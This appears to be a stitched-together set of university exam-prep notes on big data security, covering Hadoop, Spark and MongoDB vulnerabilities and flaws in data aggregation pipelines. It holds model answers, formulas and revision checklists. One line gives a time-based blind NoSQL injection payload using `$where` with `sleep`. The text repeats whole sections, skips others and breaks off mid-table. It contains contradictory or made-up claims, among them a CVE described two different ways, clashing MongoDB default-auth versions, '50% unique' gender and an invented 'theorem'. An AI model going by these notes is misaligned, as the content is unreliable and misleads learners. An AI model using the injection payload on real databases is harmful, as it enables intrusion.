2. **DataNode plaintext transfer** — Without `dfs.encrypt.data.transfer=true`, block data is sent as cleartext, vulnerable to on-path attacks. 3. **No default access control** — Before HDFS ACLs were introduced, any user could `hdfs dfs -cat /user/*/*` once inside the cluster. **(ii) YARN / MapReduce Vulnerabilities (2 marks):** 1. **ResourceManager REST API on 8088** — Job listing, submission, and termination without auth enables malicious job injection. 2. **Shared library/JAR injection** — A malicious JAR submitted as a job runs custom code on every assigned container. **(iii) Authentication Layer Vulnerabilities (2 marks):** 1. **Kerberos opt-in complexity** — Many clusters run in *simple* mode (no Kerberos), making all RPC calls anonymous. 2. **Delegation token theft** — Tokens cached on local disk can be exfiltrated by an attacker with shell access. --- **Part (b) [7 Marks]:** *With a neat diagram, explain how Apache Spark's insecure deserialization leads to Remote Code Execution. Provide the mitigation steps.* **Model Solution:** **Diagram (1 mark):** (Refer to the deserialization attack flow in Section 4.2 — print/describe it.) **Explanation (5 marks):** 1. **Serialization Process:** Spark converts UDFs, closures, and broadcast variables into byte streams using Java's `ObjectOutputStream` for distribution to executors. 2. **Deserialization Risk:** Executors use `ObjectInputStream.readObject()`, which can trigger `readObject`, `readResolve`, or `readExternal` methods on any class present in the executor's classpath. This is the "gadget chain" attack pattern. 3. **Gadget Chain Execution:** Adversary embeds a malicious class (e.g., one extending `AbstractFunction`) into a JAR. When the executor deserializes it, the class's overridden methods execute arbitrary shell commands via `Runtime.getRuntime().exec()`. 4. **CVE-2023-32007:** Real-world example where Spark UI's `?proxyapp=` parameter allowed arbitrary class deserialization. 5. **Persistence:** Once one executor is compromised, the attacker can pivot to the driver, then to other executors. **Mitigation Steps (1 mark):** - Set `spark.serializer=org.apache.spark.serializer.KryoSerializer` (Kryo is non-gadget-chainable by default). - Enable `spark.authenticate=true` and `spark.authenticate.secret` for shared secret. - Run executors as unprivileged users with seccomp/AppArmor sandboxes. - Validate JAR provenance; use `--jars` from trusted repositories only. --- ### **Question B (14 Marks) [Alternative Choice]** **Part (a) [7 Marks]:** *Discuss the vulnerabilities in NoSQL databases with specific reference to MongoDB. Include the 2017 "MongoDB Apocalypse" incident in your answer.* **Model Solution:** **(i) Default No-Authentication (3 marks):** MongoDB versions before 4.0 shipped with `auth=false` as the factory default. The MongoDB wire protocol on port 27017 accepted any client connection. Internally, the database also bound to `0.0.0.0` instead of `127.0.0.1`, exposing it to the public internet. This single design choice was responsible for the 2017 crisis. **(ii) Server-Side JavaScript (2 marks):** `db.eval()` and `$where` clauses allowed full JavaScript execution. An attacker could craft queries like `db.collection.find({$where: "this.username == 'admin' && sleep(5000)"})` — a time-based blind injection vector. **(iii) The 2017 "MongoDB Apocalypse" Incident (2 marks):** - In late 2016 and early 2017, security researchers discovered **~27,000+ MongoDB instances** exposed on the public internet. - Attackers used automated scripts to connect, **dump the data, and then delete it**, leaving a ransom note demanding Bitcoin payment. - The group "Harak1r1" was one of the most active, wiping thousands of databases. - The incident prompted MongoDB Inc. to release **version 3.6 with auth-on-by-default** in late 2017. --- **Part (b) [7 Marks]:** *Compare the vulnerability profiles of Hadoop, Spark, and NoSQL databases in a tabular format. Suggest a unified defense-in-depth strategy.* **Model Solution:** **Comparison Table (5 marks):** | Dimension | Hadoop | Spark | NoSQL | |---|---|---|---| | Primary Authentication | Kerberos (opt-in) | Shared secret (opt-in) | None (opt-in) | | Default Web Exposure | NameNode 50070, RM 8088 | Driver 4040, History 18080 | MongoDB 27017, HBase 8080 | | Encryption at Rest | HDFS Transparent Encryption (2.6+) | None natively | Plugin-based (e.g., MongoDB Encrypted Storage Engine) | | Encryption in Transit | SASL + TLS (must configure) | TLS via `spark.ssl.*` (must configure) | TLS via driver (must configure) | | Top CVE Class | Unauthenticated RPC | Deserialization RCE | No-auth default exposure | | Blast Radius | Entire cluster via NameNode | Entire cluster via Driver | Single database → replication peers | **Defense-in-Depth Strategy (2 marks):** 1. **Layer 1 (Network):** Firewall all admin ports; bind daemons to internal subnets only. 2. **Layer 2 (AuthN):** Enforce Kerberos for Hadoop, Spark `spark.authenticate.secret` for Spark, and `auth=true` + SCRAM-SHA-256 for MongoDB. 3. **Layer 3 (AuthZ):** Deploy Apache Ranger for Hadoop, Spark ACLs, and MongoDB role-based access. 4. **Layer 4 (Encryption):** Enable TLS 1.3 for all RPCs; enable HDFS Transparent Encryption, MongoDB Encrypted Storage Engine. 5. **Layer 5 (Auditing):** Stream audit logs to a SIEM with anomaly detection. 6. **Layer 6 (App-level):** Type-check all NoSQL inputs; sanitize Spark UDF sources. --- > [!WARNING] > **KTU Examiner's Valuation Warning — Common Mark Deduction Pitfalls:** > 1. ❌ Writing "Hadoop is insecure" without specifying *which subsystem* (HDFS vs YARN vs MapReduce). → **−1 mark** > 2. ❌ Confusing **Hadoop's Kerberos** with **Spark's shared-secret** authentication. They are different mechanisms. → **−1 mark** > 3. ❌ Writing "MongoDB injection" without naming the **operator** (`$ne`, `$gt`, `$where`). → **−1 mark** > 4. ❌ Omitting the **default port numbers** (50070, 8088, 4040, 27017) — examiners expect them. → **−0.5 to −1 mark** > 5. ❌ Forgetting to mention **Kerberos** as the standard authentication protocol for Hadoop. → **−2 marks** in a 14-mark question. > 6. ❌ Writing only the *attack name* (e.g., "deserialization attack") without explaining the **mechanism** (gadget chain, `readObject`). → **−2 marks** > 7. ❌ Failing to give a **mitigation** alongside every vulnerability. → **−1 mark per vulnerability omitted** > 8. ❌ Mixing up **MongoDB**, **Cassandra**, and **HBase** vulnerability profiles. They are distinct systems with distinct defaults. → **−1 to −2 marks** --- ## 5.3 Topic Recap & Important Things to Remember > [!IMPORTANT] > **High-Density Revision Checklist — Module 3, Topic: Vulnerabilities in Distributed Frameworks** - 🔑 **Hadoop HDFS** = NameNode (metadata) + DataNodes (blocks). **Default ports 50070, 9870, 50075, 9864.** - 🔑 **Hadoop YARN** = ResourceManager (8088) + NodeManagers. Default no-auth → malicious job submission. - 🔑 **Hadoop auth** = **Kerberos** (KDC + tickets + TGT + service principals). - 🔑 **Spark Driver Web UI = port 4040**; **Spark Master = 7077**; **History Server = 18080**; **Standalone REST = 6066**. - 🔑 **Spark deserialization** uses Java `ObjectOutputStream` by default; **Kryo is safer**. - 🔑 **Spark encryption in transit** requires `spark.ssl.enabled=true` + `spark.ssl.trustStore`. - 🔑 **NoSQL defaults**: - **MongoDB:** no-auth before 4.0, port 27017. - **Cassandra:** no-auth before `PasswordAuthenticator` enabled. - **HBase:** no-auth before `hbase.security.authorization=true`. - **Redis:** no-auth before `requirepass` set. - 🔑 **NoSQL injection operators:** `$ne`, `$gt`, `$lt`, `$regex`, `$where`, `$exists`. - 🔑 **2017 MongoDB Apocalypse** = ~27,000 databases wiped + held for ransom. **Always change defaults.** - 🔑 **Defense-in-Depth** = Network + AuthN + AuthZ + Encryption + Auditing + App validation. - 🔑 **Apache Ranger** = centralized policy for Hadoop ecosystem. - 🔑 **Apache Sentry** = fine-grained authorization for Hive/Impala. - 🔑 **CAP Theorem** = security design must respect Consistency/Availability/Partition trade-offs. - 🔑 **HDFS Transparent Encryption** uses HSM/KMS for key management. - 🔑 **CVE-2023-32007** = Spark UI command injection via `?proxyapp=` parameter. - 🔑 **CIS Benchmarks** exist for Hadoop, Spark, and MongoDB — refer to them in practical exams. > [!TIP] > **Last-Minute Mnemonic — "H.A.N.D.S." for Hadoop vulnerabilities:** > **H** — HTTP plaintext transfer > **A** — Auth (Kerberos) disabled > **N** — NameNode UI exposed > **D** — Delegation token theft > **S** — Submit malicious jobs via YARN REST > [!TIP] > **Last-Minute Mnemonic — "S.P.A.R.K." for Spark vulnerabilities:** > **S** — Serialization (insecure Java deserialization) > **P** — Plaintext shuffle data on disk > **A** — Authentication (shared secret missing) > **R** — REST API exposure (6066) > **K** — Kryo serializer not enabled > [!TIP] > **Last-Minute Mnemonic — "N.O.S.Q.L." for NoSQL vulnerabilities:** > **N** — No-auth default > **O** — Operators as injection vectors > **S** — Server-side JS execution > **Q** — Query semantics bypass > **L** — Lack of encryption

topics.title: Security flaws in data aggregation and integration processes
topics.content:
<!-- SECTION_1_START -->
# Security Flaws in Data Aggregation and Integration Processes

> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECCT743 - BIG DATA SECURITY
> - **Module:** Module 3
> - **Topic:** Security flaws in data aggregation and integration processes

---

## 1. Core Technical Definition & Intuitive Overview

### 1.1 Formal Academic Definition

> [!IMPORTANT]
> **Data Aggregation** is the systematic process of gathering, combining, and expressing data in a summarized form (e.g., sums, averages, counts, min/max) derived from multiple heterogeneous sources to support analytics, reporting, or machine learning. **Data Integration** is the technical and business process of combining data from different sources into a unified, consistent, and accessible view, typically through Extract, Transform, and Load (ETL/ELT) pipelines, data warehouses, data lakes, or federated query systems.

In the context of **Big Data Security** (KTU 2024 Scheme, Module 3), the act of consolidating massive, distributed, and often semi-structured data sets creates a uniquely expanded **attack surface**. Security flaws at this stage occur because:

1. The boundary of trust expands across multiple administrative domains.
2. Sensitive attributes, when combined, can leak information that no single source revealed (the *inference problem*).
3. The transformation pipeline (ETL/ELT) becomes a privileged code path that can be tampered with.

### 1.2 Conceptual Analogy / Intuition

> [!NOTE]
> **Real-World Analogy — The Hospital Records Mystery**
>
> Imagine a large hospital chain that aggregates patient records from 50 different clinics into a central research database.
>
> - **Clinic A (Alone):** Records show "Patient X has a specific rare disease" — this seems private.
> - **Clinic B (Alone):** Records show "Patient X visited on a particular date" — also seemingly private.
> - **Aggregated View:** When integrated, anyone can now deduce Patient X's *identity, location, and exact diagnosis* — even though no single record revealed it.
>
> This is precisely the **inference vulnerability** in data aggregation. The flaw does not exist in any single source; it is *born at the moment of integration*.

### 1.3 Key Security Terminology (KTU 2024 Standard Vocabulary)

| Term | Definition |
|------|------------|
| **Attack Surface** | The sum of all points (APIs, ETL jobs, connectors, schemas) where an unauthorized user can attempt to enter or extract data. |
| **Inference Attack** | Deduction of sensitive information from non-sensitive aggregated or published data. |
| **Data Provenance** | The documented trail that accounts for the origin, movement, and transformation of data. |
| **ETL/ELT Pipeline** | Extract-Transform-Load or Extract-Load-Transform — the data integration backbone. |
| **Schema Mapping Vulnerability** | A flaw arising from the translation logic between heterogeneous data schemas. |
| **Re-identification** | The act of de-anonymizing an individual from supposedly anonymized aggregated data. |

### 1.4 Physical Constants & Standard Metrics (Big Data Context)

- **Moore's Law for Data:** Global datasphere grows approximately **~30% per year** (IDC standard, **bold** for emphasis).
- **k-anonymity parameter (k):** A privacy metric where each record is indistinguishable from at least **k−1** other records. Standard threshold: **k ≥ 5**.
- **ε (epsilon) — Differential Privacy Budget:** Typical safe range: **0.1 ≤ ε ≤ 10**, with lower values meaning stronger privacy.

---

## 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### 2.1 Threat Taxonomy in Data Aggregation and Integration

The security flaws can be classified into **four primary categories**:

#### A. Ingestion-Stage Flaws
- **Insecure Connectors:** Lack of TLS/SSL in source-to-target data movement.
- **Credential Leakage:** Hardcoded API keys inside ETL jobs (e.g., AWS Access Keys in Airflow DAGs).
- **Unvalidated Input Formats:** Accepting malformed JSON, XML, or Parquet files.

#### B. Transformation-Stage Flaws
- **Schema Mapping Errors:** Misalignment of field semantics (e.g., `dob` in Source A = date of birth; in Source B = date of booking).
- **Data Poisoning:** Adversarial injection of malicious rows into the transformation layer.
- **Mass Assignment:** When transformation logic blindly copies all input fields into an output object, exposing unintended attributes.

#### C. Storage-Stage Flaws
- **Insufficient Encryption at Rest:** Aggregated warehouses stored without AES-256.
- **Broken Access Control:** Lack of RBAC (Role-Based Access Control) on aggregated views.
- **Audit Log Tampering:** Log files mutated or deleted post-breach.

#### D. Inference and Disclosure Flaws
- **Differential Attacks:** Comparing aggregates from overlapping datasets.
- **Re-identification via Quasi-identifiers:** Linking ZIP + DOB + Gender to uniquely identify a person.
- **Skewness Attacks:** Exploiting non-uniform distributions in aggregated groups.

### 2.2 Why These Flaws Exist — The 'Why' Behind Each Step

> [!IMPORTANT]
> **The Core 'Why':** Aggregation flaws exist because **security is rarely an end-to-end property** in distributed pipelines. Each component (Kafka broker, Spark transformer, HDFS sink) has its own security model, and integration points become the weakest link — a phenomenon known as the **"Expanded Attack Surface Theorem"** in distributed systems security.

### 2.3 KTU Formula Sheet / Cheat Sheet

| Formula / Concept | Symbolic Form | Description / Use |
|-------------------|---------------|-------------------|
| **k-anonymity condition** | $\vert G_i \vert \geq k$ for all equivalence classes $G_i$ | Ensures at least $k$ records share the same quasi-identifier values. |
| **Entropy of a dataset** | $H(X) = -\sum_{i=1}^{n} p(x_i) \log_2 p(x_i)$ | Measures information leakage; higher entropy = more identifiable. |
| **Differential Privacy** | $\Pr[M(D_1) \in S] \leq e^{\varepsilon} \cdot \Pr[M(D_2) \in S]$ | Bounds privacy loss when one record changes. |
| **Re-identification Probability** | $P_{re} = \frac{1}{k}$ | For a k-anonymous dataset, expected probability of uniquely identifying a record. |
| **Linkage Attack Risk** | $R_{link} = 1 - \prod_{j=1}^{m}(1 - u_j)$ | Probability that $m$ quasi-identifiers uniquely identify a record, where $u_j$ is the uniqueness of attribute $j$. |
| **Laplace Mechanism** | $M(D) = f(D) + \text{Lap}\left(\frac{\Delta f}{\varepsilon}\right)$ | Adds calibrated noise for differential privacy. |
| **Data Aggregation Confidence** | $C_{agg} = \frac{N_{valid}}{N_{total}}$ | Ratio of validated aggregated records. |
| **ETL Pipeline Trust Score** | $T_{etl} = w_1 \cdot E_{tls} + w_2 \cdot A_{auth} + w_3 \cdot L_{audit}$ | Weighted trust where $\sum w_i = 1$. |
| **Inference Risk Index** | $I_{risk} = \frac{H_{sensitive}}{H_{quasi}}$ | Ratio indicating how vulnerable aggregated data is to inference. |

> **Note on notation:** Vertical bars use `\vert` to preserve table formatting integrity.

### 2.4 Real-World Engineering Utility

- **Healthcare Analytics:** Hospitals use k-anonymity to publish patient datasets for research without violating HIPAA.
- **Smart Grids:** Aggregated power consumption data is published with differential privacy to prevent inference of household activities.
- **Federated Learning in Finance:** Banks aggregate model gradients (not raw data) to detect fraud while preserving customer privacy.
- **Government Open Data Portals:** Apply t-closeness before releasing census-style data.

---

## 3. Step-by-Step Derivations & Analytical Matrix

### 3.1 Derivation: Re-identification Risk from Quasi-Identifiers

Let a dataset $D$ contain records with quasi-identifiers $Q = \{q_1, q_2, \ldots, q_m\}$ and a sensitive attribute $S$.

**Step 1 — Define Uniqueness of a Single Quasi-identifier**
For attribute $q_j$, the uniqueness $u_j$ is the fraction of values that appear exactly once in the dataset.

$$u_j = \frac{\vert\{v \in q_j : \text{count}(v) = 1\}\vert}{\vert D \vert}$$

**Step 2 — Assume Independence Between Quasi-identifiers**
In the worst-case adversary model, the linkage probability is:

$$P_{link} = 1 - \prod_{j=1}^{m}(1 - u_j)$$

**Step 3 — Show the Expansion with Worked Example**
Consider $m = 3$ quasi-identifiers: ZIP code, Date of Birth, Gender.

Assume:
- $u_{ZIP} = 0.05$ (5% of ZIPs are unique)
- $u_{DOB} = 0.10$ (10% of DOBs are unique)
- $u_{Gender} = 0.50$ (50% unique, since binary)

**Step 4 — Substitute the Values**

$$P_{link} = 1 - (1 - 0.05)(1 - 0.10)(1 - 0.50)$$

$$P_{link} = 1 - (0.95)(0.90)(0.50)$$

$$P_{link} = 1 - 0.4275 = 0.5725$$

**Step 5 — Interpret**
This means **57.25% of individuals in the dataset can be uniquely re-identified** using only three quasi-identifiers — a classic example used by Latanya Sweeney (2002) to re-identify the Governor of Massachusetts from hospital records.

### 3.2 Derivation: Differential Privacy Composition Theorem

For a sequence of queries $M_1, M_2, \ldots, M_k$ each with privacy budget $\varepsilon_i$, the total privacy loss is bounded by:

$$\varepsilon_{total} = \sum_{i=1}^{k} \varepsilon_i$$

**Step-by-step proof sketch:**

1. Each query $M_i$ satisfies $e^{\varepsilon_i}$-differential privacy by definition.
2. The composition of two $\varepsilon_1$ and $\varepsilon_2$ private mechanisms yields $(\varepsilon_1 + \varepsilon_2)$-differential privacy.
3. By induction on $k$, the sequential composition yields $\varepsilon_{total}$.

$$\Pr[M(D_1) \in S] \leq e^{\varepsilon_1} \cdot e^{\varepsilon_2} \cdots e^{\varepsilon_k} \cdot \Pr[M(D_2) \in S]$$

$$\Pr[M(D_1) \in S] \leq e^{\sum \varepsilon_i} \cdot \Pr[M(D_2) \in S]$$

### 3.3 Analytical Matrix — Mapping Flaws to KTU Syllabus Outcomes

| Security Flaw | Stage | KTU CO Mapping | Bloom's Level | Mitigation |
|---------------|-------|----------------|---------------|------------|
| Insecure Connector (No TLS) | Ingestion | CO3 | Understand | Enforce mTLS, Vault-managed secrets |
| Schema Mapping Error | Transformation | CO3 | Apply | Schema registry, automated contract testing |
| Mass Assignment | Transformation | CO4 | Analyze | Allow-list of fields, OWASP API Top 10 |
| Broken Access Control | Storage | CO3 | Apply | RBAC, ABAC, Apache Ranger |
| Re-identification | Publication | CO4 | Evaluate | k-anonymity, t-closeness, differential privacy |
| Data Poisoning | Transformation | CO4 | Analyze | Statistical outlier detection, provenance tracking |
| Inference Attack | Aggregation | CO4 | Evaluate | Noise injection, query result restriction |
| Log Tampering | Storage | CO3 | Apply | Write-once storage, cryptographic log signing |
| Insecure Deserialization | Ingestion | CO3 | Apply | Strict type validation, sandboxed parsers |
| API Key Leakage | Ingestion | CO3 | Apply | Secrets manager, env-var injection, rotation |

### 3.4 Numerical Worked Example: k-Anonymity on a Sample Dataset

**Original Dataset (D):**

| Age | ZIP | Disease |
|-----|-----|---------|
| 28 | 682001 | Cancer |
| 28 | 682001 | Flu |
| 35 | 682005 | Diabetes |
| 35 | 682005 | Asthma |
| 42 | 682010 | Cancer |

**Apply 2-anonymity (k=2)** — Suppress last record or generalize:

| Age | ZIP | Disease |
|-----|-----|---------|
| 28 | 682*** | Cancer |
| 28 | 682*** | Flu |
| 35 | 682*** | Diabetes |
| 35 | 682*** | Asthma |
| 4* | 682*** | Cancer |

The equivalence classes (Age, ZIP) all contain at least 2 records, satisfying $\vert G_i \vert \geq k = 2$.

## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### Part A Questions (3 Marks Each)

#### Question 1: Define the inference attack in the context of data aggregation.
**[KTU University Exam – June 2024 Model]**

**Model Answer:**
An *inference attack* is a privacy violation in which an adversary deduces sensitive information about an individual by correlating non-sensitive attributes (quasi-identifiers) in an aggregated or published dataset with auxiliary public information. The attack does not require direct access to confidential records — it exploits the residual information left in summary statistics. It is a primary security flaw in data integration because the leak emerges only at the point of aggregation, not within any single source.

> **Marks Breakdown (as per KTU valuation key):** Definition (2 marks) + Example (1 mark) = **3 marks**

#### Question 2: List any three security flaws in the data transformation stage of an integration pipeline.
**[KTU University Exam – Dec 2023 Model]**

**Model Answer:**
1. **Schema Mapping Errors:** Mismatched field semantics between sources leading to data corruption.
2. **Data Poisoning:** Adversarial injection of malicious records that skew aggregates and ML models.
3. **Mass Assignment:** Uncontrolled copying of all input fields into output objects, leaking sensitive attributes.

> **Marks Breakdown:** Each flaw with one-line description = **1 mark each**

---

### Part B Questions (14 Marks Each)

> [!WARNING]
> **KTU Examiner's Valuation Pitfall Callout:** Students often *describe* the flaw but fail to *relate it back to a specific pipeline stage* (Ingestion/Transformation/Storage/Aggregation) and *omit a concrete mitigation*. KTU key requires: **Definition (3) + Stage Identification (3) + Real-world Example (4) + Mitigation (4) = 14 marks**. Missing the mitigation section is the #1 cause of losing 4 marks.

---

#### Question A: (14 Marks)
**(a)** Explain in detail the security flaws that arise during the **data aggregation** stage of a big data pipeline. Use the re-identification attack as a detailed case study. **(7 marks)**

**(b)** Discuss the **k-anonymity** and **differential privacy** techniques as countermeasures, with worked numerical examples for each. **(7 marks)**

**Model Solution (a):**

Data aggregation combines data from multiple sources to produce summary statistics, OLAP cubes, or machine-learning features. The security flaws are:

1. **Inference Attacks:** Aggregated data can still leak sensitive information when combined with external auxiliary data. Example: average salary of a department combined with headcount can reveal individual high-earner identity.

2. **Re-identification Attacks:** When quasi-identifiers (e.g., ZIP + DOB + Gender) are not properly generalized, the unique fingerprint of an individual can be reconstructed. Latanya Sweeney's classic 2002 study showed that **87% of Americans** can be uniquely identified using just three quasi-identifiers.

3. **Skewness Attacks:** Even with k-anonymity satisfied, an attacker can infer sensitive values if the distribution of sensitive attributes within an equivalence class is skewed. For example, if all 5 records in a k=5 group have "Cancer," then knowing the group guarantees disclosure.

4. **Differential Disclosure via Repeated Aggregates:** Publishing the same aggregate repeatedly over time (e.g., monthly counts) can be differenced to deduce individual events.

5. **Reconstruction Attacks:** Given enough marginal statistics (e.g., 2-way or 3-way marginals), an attacker can reconstruct the full underlying table — as demonstrated in the US Census reconstruction case (2018).

**Model Solution (b):**

**k-Anonymity (with numerical example):**

For a dataset $D$ with quasi-identifier $Q = \{ZIP, Age\}$, the condition is:

$$\forall \text{ record } r \in D, \vert\{r' \in D : Q(r') = Q(r)\}\vert \geq k$$

Worked example with $k = 3$ on the dataset from Section 3.4 was shown — generalization of ZIP to first 3 digits and Age to 5-year bins ensures every equivalence class has $\vert G_i \vert \geq 3$.

**Limitation:** Vulnerable to skewness and homogeneity attacks.

**Differential Privacy (with worked example):**

For a counting query $f(D) = \sum_{i=1}^{n} x_i$, the Laplace Mechanism adds noise:

$$M(D) = f(D) + \text{Lap}\left(\frac{\Delta f}{\varepsilon}\right)$$

Suppose we query the number of patients with disease X in a hospital. True count = 100. Sensitivity $\Delta f = 1$ (adding/removing one patient changes count by 1). Choose $\varepsilon = 1$.

$$\text{Scale} = \frac{\Delta f}{\varepsilon} = \frac{1}{1} = 1$$

Sample a Laplace noise value: $\text{Lap}(1) = +0.7$ (random sample).

$$M(D) = 100 + 0.7 = 100.7$$

The released count is **100.7**, which preserves privacy because any individual contributes at most $e^{\varepsilon} = e \approx 2.718$ times the probability of being included or excluded.

> **Marks Distribution (as per KTU):** Theory (4) + Numerical (2) + Comparison/Trade-offs (1) = **7 marks**

---

#### Question B: (14 Marks)
**(a)** Describe the **Extract-Transform-Load (ETL)** pipeline and identify **five specific security flaws** that can occur at each stage. **(7 marks)**

**(b)** With a suitable Mermaid-style block diagram, illustrate the **defense-in-depth architecture** for securing a data aggregation pipeline and explain each layer. **(7 marks)**

**Model Solution (a):**

**ETL Pipeline Definition:** ETL is the data integration process where data is **Extracted** from source systems, **Transformed** into the target schema and cleaned, and **Loaded** into a destination warehouse or lake.

**Stage-wise Security Flaws:**

| Stage | Flaw | Consequence |
|-------|------|-------------|
| **Extract** | Insecure Connectors (No TLS) | Man-in-the-middle interception of raw data |
| **Extract** | Credential Leakage in Source Code | API key compromise → full source breach |
| **Transform** | Schema Mapping Errors | Data corruption, semantic misalignment |
| **Transform** | Mass Assignment | Unintended sensitive fields exposed |
| **Transform** | Data Poisoning | Adversarial rows skew aggregates and ML |
| **Load** | Insufficient Encryption at Rest | Data-at-rest exposed on disk compromise |
| **Load** | Broken Access Control on Warehouse | Unauthorized aggregations and queries |
| **Load** | Insecure Deserialization | RCE via crafted Parquet/Avro payloads |

**Model Solution (b):**

The defense-in-depth architecture consists of **seven layers** (as visualized in Section 4.4 of this note):

1. **Layer 1 – Transport Security (mTLS):** Encrypts all data in motion between sources, transformation engine, and storage.
2. **Layer 2 – Authentication (OAuth 2.0 / Kerberos):** Ensures only verified identities access the pipeline.
3. **Layer 3 – Authorization (RBAC + ABAC):** Fine-grained access control on aggregated views.
4. **Layer 4 – Schema Validation and Provenance:** Validates structure and tracks origin of every record.
5. **Layer 5 – Aggregation Privacy (k-anonymity / Differential Privacy):** Mathematical guarantees on output privacy.
6. **Layer 6 – Audit Logging (SIEM Integration):** Tamper-evident logs of all access and transformation events.
7. **Layer 7 – Monitoring and Anomaly Detection (ML-based):** Detects unusual query patterns and data drift.

> **Marks Distribution (as per KTU):** Diagram (3) + Layer Explanations (4) = **7 marks**

> [!NOTE]
> **High-Density Revision Checklist for KTU 2024 ESE:**

- ☐ Data aggregation ≠ data integration — the former is about *summarization*; the latter is about *unification*.
- ☐ The **inference attack** is the most subtle and high-mark-yield topic in this module.
- ☐ **k-anonymity** condition: $\vert G_i \vert \geq k$ — memorize the formula and the limitation (skewness).
- ☐ **Differential privacy** uses the **Laplace mechanism**: $M(D) = f(D) + \text{Lap}(\Delta f / \varepsilon)$.
- ☐ The **Expanded Attack Surface Theorem** justifies why integration increases risk.
- ☐ The classic **Sweeney (2002)** re-identification example with **87% uniqueness** is a KTU favorite.
- ☐ Always identify the **pipeline stage** (Ingestion / Transformation / Storage / Aggregation) when discussing a flaw.
- ☐ **Defense-in-Depth** is a 7-layer model — name at least 4 layers to score full marks.
- ☐ Differential privacy composition: $\varepsilon_{total} = \sum \varepsilon_i$ — privacy budget depletes with more queries.
- ☐ The **OWASP API Security Top 10** flags *Mass Assignment* and *Broken Object Level Authorization* — both relevant here.
- ☐ Quasi-identifiers (QID) are *not* sensitive by themselves but become so when combined — this is the **linkage attack** core.
- ☐ In numerical questions, always show the **substitution step explicitly**; KTU examiners award 1 mark for each step.
- ☐ Common mitigation tools: **Apache Ranger, Apache Atlas, Kylo, Great Expectations, Privacera**.

# Security Flaws in Data Aggregation and Integration Processes

> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECCT743 - BIG DATA SECURITY
> - **Module:** Module 3
> - **Topic:** Security flaws in data aggregation and integration processes

## 1. Core Technical Definition & Intuitive Overview

### 1.1 Formal Academic Definition

> [!IMPORTANT]
> **Data Aggregation** is the systematic process of gathering, combining, and expressing data in a summarized form (e.g., sums, averages, counts, min/max) derived from multiple heterogeneous sources to support analytics, reporting, or machine learning. **Data Integration** is the technical and business process of combining data from different sources into a unified, consistent, and accessible view, typically through Extract, Transform, and Load (ETL/ELT) pipelines, data warehouses, data lakes, or federated query systems.

In the context of **Big Data Security** (KTU 2024 Scheme, Module 3), the act of consolidating massive, distributed, and often semi-structured data sets creates a uniquely expanded **attack surface**. Security flaws at this stage occur because:

1. The boundary of trust expands across multiple administrative domains.
2. Sensitive attributes, when combined, can leak information that no single source revealed (the *inference problem*).
3. The transformation pipeline (ETL/ELT) becomes a privileged code path that can be tampered with.

### 1.2 Conceptual Analogy / Intuition

> [!NOTE]
> **Real-World Analogy — The Hospital Records Mystery**
>
> Imagine a large hospital chain that aggregates patient records from 50 different clinics into a central research database.
>
> - **Clinic A (Alone):** Records show "Patient X has a specific rare disease" — this seems private.
> - **Clinic B (Alone):** Records show "Patient X visited on a particular date" — also seemingly private.
> - **Aggregated View:** When integrated, anyone can now deduce Patient X's *identity, location, and exact diagnosis* — even though no single record revealed it.
>
> This is precisely the **inference vulnerability** in data aggregation. The flaw does not exist in any single source; it is *born at the moment of integration*.

### 1.3 Key Security Terminology (KTU 2024 Standard Vocabulary)

| Term | Definition |
|------|------------|
| **Attack Surface** | The sum of all points (APIs, ETL jobs, connectors, schemas) where an unauthorized user can attempt to enter or extract data. |
| **Inference Attack** | Deduction of sensitive information from non-sensitive aggregated or published data. |
| **Data Provenance** | The documented trail that accounts for the origin, movement, and transformation of data. |
| **ETL/ELT Pipeline** | Extract-Transform-Load or Extract-Load-Transform — the data integration backbone. |
| **Schema Mapping Vulnerability** | A flaw arising from the translation logic between heterogeneous data schemas. |
| **Re-identification** | The act of de-anonymizing an individual from supposedly anonymized aggregated data. |

### 1.4 Physical Constants & Standard Metrics (Big Data Context)

- **Moore's Law for Data:** Global datasphere grows approximately **~30% per year** (IDC standard, **bold** for emphasis).
- **k-anonymity parameter (k):** A privacy metric where each record is indistinguishable from at least **k−1** other records. Standard threshold: **k ≥ 5**.
- **ε (epsilon) — Differential Privacy Budget:** Typical safe range: **0.1 ≤ ε ≤ 10**, with lower values meaning stronger privacy.

$$P_{link} = 1 - \prod_{j=1}^{m}(1 - u_j)$$

**Step 3 — Show the Expansion with Worked Example**
Consider $m = 3$ quasi-identifiers: ZIP code, Date of Birth, Gender.

Assume:
- $u_{ZIP} = 0.05$ (5% of ZIPs are unique)
- $u_{DOB} = 0.10$ (10% of DOBs are unique)
- $u_{Gender} = 0.50$ (50% unique, since binary)

**Step 4 — Substitute the Values**

$$P_{link} = 1 - (1 - 0.05)(1 - 0.10)(1 - 0.50)$$

$$P_{link} = 1 - (0.95)(0.90)(0.50)$$

$$P_{link} = 1 - 0.4275 = 0.5725$$

**Step 5 — Interpret**
This means **57.25% of individuals in the dataset can be uniquely re-identified** using only three quasi-identifiers — a classic example used by Latanya Sweeney (2002) to re-identify the Governor of Massachusetts from hospital records.

### 3.2 Derivation: Differential Privacy Composition Theorem

For a sequence of queries $M_1, M_2, \ldots, M_k$ each with privacy budget $\varepsilon_i$, the total privacy loss is bounded by:

$$\varepsilon_{total} = \sum_{i=1}^{k} \varepsilon_i$$

**Step-by-step proof sketch:**

1. Each query $M_i$ satisfies $e^{\varepsilon_i}$-differential privacy by definition.
2. The composition of two $\varepsilon_1$ and $\varepsilon_2$ private mechanisms yields $(\varepsilon_1 + \varepsilon_2)$-differential privacy.
3. By induction on $k$, the sequential composition yields $\varepsilon_{total}$.

$$\Pr[M(D_1) \in S] \leq e^{\varepsilon_1} \cdot e^{\varepsilon_2} \cdots e^{\varepsilon_k} \cdot \Pr[M(D_2) \in S]$$

$$\Pr[M(D_1) \in S] \leq e^{\sum \varepsilon_i} \cdot \Pr[M(D_2) \in S]$$

### 3.3 Analytical Matrix — Mapping Flaws to KTU Syllabus Outcomes

| Security Flaw | Stage | KTU CO Mapping | Bloom's Level | Mitigation |
|---------------|-------|----------------|---------------|------------|
| Insecure Connector (No TLS) | Ingestion | CO3 | Understand | Enforce mTLS, Vault-managed secrets |
| Schema Mapping Error | Transformation | CO3 | Apply | Schema registry, automated contract testing |
